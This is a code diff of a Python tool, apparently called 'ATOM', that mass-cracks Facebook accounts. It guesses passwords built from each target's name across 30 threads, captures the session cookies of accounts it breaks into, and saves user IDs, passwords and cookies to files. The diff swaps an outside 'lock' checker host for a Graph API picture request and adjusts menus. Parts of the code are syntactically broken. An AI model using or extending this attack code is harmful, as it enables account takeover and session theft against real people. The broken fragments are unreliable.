@@ -516,7 +516,7 @@ def cr():
                print(f"\n{wt}{RED}File %s not found"%(fileX))
                mainx()
 def setting():
-    clear();banner();print(f"{dot}{P}Total Ids {RED}: {H}"+str(len(id)));print(led);print(f' {K}[{H}1{K}] {P}New Ids Crack [{H}Fast{P}]');print(f' {K}[{H}2{K}] {P}Mix Ids Crack [{H}Test{P}]');print(f' {K}[{H}3{K}] {P}Old Ids Crack [{H}Slow{P}]');print(led)
+    clear();banner();print(f"{dot}{P}Total Ids {RED}: {H}"+str(len(id)));print(led);print(f' {K}[{H}1{K}] {P}START WITH MIX Crack [{H}Fast{P}]');print(f' {K}[{H}2{K}] {P}START WITH NEW Crack [{H}Test{P}]');print(f' {K}[{H}3{K}] {P}START WITH OLD Crack [{H}Slow{P}]');print(led)
     hu = input(f'{dot}Select menu {M}:{H} ')
     if hu in ['3','old']:
         for tua in sorted(id):
@@ -552,14 +552,14 @@ def setting():
     elif hc in ['5','05']:method.append('m5')
     elif hc in ['6','06']:method.append('m6')
     else:method.append('m1')
-    clear();banner();print(f"{dot}{P}Total Ids {RED}: {H}"+str(len(id)));print(led);print(f' {K}[{H}1{K}] {P}Password [{H}first+last{P}]');print(f' {K}[{H}2{K}] {P}Password [{H}first+last+3{P}]');print(f' {K}[{H}3{K}] {P}Password [{H}first+last+5+{P}]');print(f' {K}[{H}4{K}] {P}Password [{H}first+last+7+{P}]');print(led)
+    clear();banner();print(f"{dot}{P}Total Ids {RED}: {H}"+str(len(id)));print(led);print(f' {K}[{H}1{K}] {P}Password [{H}LIST ONE{P}]');print(f' {K}[{H}2{K}] {P}Password [{H}LIST TWO{P}]');print(f' {K}[{H}3{K}] {P}Password [{H}LIST THREE{P}]');print(f' {K}[{H}4{K}] {P}Password [{H}LIST FOUR{P}]');print(led)
     px=input(f'{wt}Select Password {M}:{H} ')
     if px in ['1','01']:p1()
     elif px in ['2','02']:p2()
     elif px in ['3','03']:p3()
     else:p4()
 def p1():
-    os.system("clear");banner();print(f'{dot}File Ids{M}  : {H}'+str(len(id)));print(led);print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;print(led)
+    os.system("clear");banner();;print(f'{dot}File Ids{M}  : {H}'+str(len(id)));print(led);print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;print(led);print(f'{dot}YOUR CITY{RED}    : {H}{current_city}');print(led)
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -568,10 +568,10 @@ def p1():
             if len(nmf)<6:
                 if len(frs)<3:
                     pass
-                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12');pwv.append(frs+'@123');pwv.append(frs+'@12');pwv.append(frs+'@00');pwv.append(frs+'000')
+                else:pwv.append(nmf);pwv.append(frs+'@123');pwv.append(frs+'@1234');pwv.append(frs+'@12');pwv.append(frs+'123');pwv.append(frs+'12');pwv.append(frs+'@@@');pwv.append(frs+'000')
             else:
-                if len(frs)<3:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12');pwv.append(frs+'@123');pwv.append(frs+'@12')
-                else:pwv.append(nmf);pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12');pwv.append(frs+'@123');pwv.append(frs+'@12');pwv.append(frs+'@00');pwv.append(frs+'000')
+                if len(frs)<3:pwv.append(nmf);pwv.append(frs+'@123');pwv.append(frs+'@1234');pwv.append(frs+'@12');pwv.append(frs+'123');pwv.append(frs+'12');pwv.append(frs+'@@@');pwv.append(frs+'000')
+                else:pwv.append(nmf);pwv.append(frs+'@123');pwv.append(frs+'@1234');pwv.append(frs+'@12');pwv.append(frs+'123');pwv.append(frs+'12');pwv.append(frs+'@@@');pwv.append(frs+'000')
             if 'ya' in pwpluss:
                 for xpwd in pwnya:pwv.append(xpwd)
             else:pass
@@ -609,7 +609,7 @@ def p2():
             else:pool.submit(m5,idf,pwv)
     print('');print(f'{gen}Hi Dear User Crack process has been completed');exit()
 def p3():
-    os.system("clear");banner();print(f'{dot}File Ids{M}  : {H}'+str(len(id)));print(led);print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;print(led)
+    os.system("clear");banner();;print(f'{dot}File Ids{M}  : {H}'+str(len(id)));print(led);print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;print(led);print(f'{dot}YOUR CITY{RED}    : {H}{current_city}');print(led)
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -634,7 +634,7 @@ def p3():
             else:pool.submit(m5,idf,pwv)
     print('');print(f'{gen}Hi Dear User Crack process has been completed');exit()
 def p4():
-    os.system("clear");banner();print(f'{dot}File Ids{M}  : {H}'+str(len(id)));print(led);print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;print(led)
+    os.system("clear");banner();;print(f'{dot}File Ids{M}  : {H}'+str(len(id)));print(led);print(f'{dot}{N}SPEED BOOST {B}[{H}ON{P}/{M}OFF{B}]{N} AIRPLANE MODE 🚀 ') ;print(led);print(f'{dot}YOUR CITY{RED}    : {H}{current_city}');print(led)
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -1140,18 +1140,12 @@ def m4(idf,pwv):
    if 'c_user' in log_cookies:
     coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
     user = re.findall('c_user=(.*);xs', coki)[0]
-    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+    url = f'https://graph.facebook.com/{user}/picture?type=normal'
     reqx = requests.get(url).text
-    if 'live' in reqx:
+    if 'Photoshop' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
-            ok+=1 
-            break
-    if 'lock' in reqx:
-            print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
-            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            open('/sdcard/ATOM-COOKIES-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
    elif 'checkpoint' in log_cookies:
@@ -1159,9 +1153,9 @@ def m4(idf,pwv):
     coki1 = coki.split("1000")[1]
     uid = "1000"+coki1[0:11]
     if 'y' in cp_xdx:
-     print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{uid}|{ps}{xxx}')
-    open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
-    cp.append(uid)
+     print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{ps}{xxx}')
+     open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
+     cp.append(uid)
    else:
     continue
   loop+=1
@@ -1216,18 +1210,12 @@ def m5(idf,pwv):
    if 'c_user' in log_cookies:
     coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
     user = re.findall('c_user=(.*);xs', coki)[0]
-    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+    url = f'https://graph.facebook.com/{user}/picture?type=normal'
     reqx = requests.get(url).text
-    if 'live' in reqx:
+    if 'Photoshop' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
-            ok+=1 
-            break
-    if 'lock' in reqx:
-            print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
-            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            open('/sdcard/ATOM-COOKIES-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
    elif 'checkpoint' in log_cookies:
@@ -1235,13 +1223,12 @@ def m5(idf,pwv):
     coki1 = coki.split("1000")[1]
     uid = "1000"+coki1[0:11]
     if 'y' in cp_xdx:
-     print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{uid}|{ps}{xxx}')
-    open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
-    cp.append(uid)
+     print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{ps}{xxx}')
+     open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
+     cp.append(uid)
    else:
     continue
   loop+=1
-  
  except: requests.exceptions.ConnectionError:
   time.sleep(10)
  except Exception as e:
@@ -1293,18 +1280,12 @@ def m6(idf,pwv):
    if 'c_user' in log_cookies:
     coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
     user = re.findall('c_user=(.*);xs', coki)[0]
-    url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
+    url = f'https://graph.facebook.com/{user}/picture?type=normal'
     reqx = requests.get(url).text
-    if 'live' in reqx:
+    if 'Photoshop' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
-            ok+=1 
-            break
-    if 'lock' in reqx:
-            print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
-            print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-M6-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            open('/sdcard/ATOM-COOKIES-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
    elif 'checkpoint' in log_cookies:
@@ -1313,12 +1294,11 @@ def m6(idf,pwv):
     uid = "1000"+coki1[0:11]
     if 'y' in cp_xdx:
      print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{uid}|{ps}{xxx}')
-    open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
-    cp.append(uid)
+     open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
+     cp.append(uid)
    else:
     continue
   loop+=1
-  
  except: requests.exceptions.ConnectionError:
   time.sleep(10)
  except Exception as e:
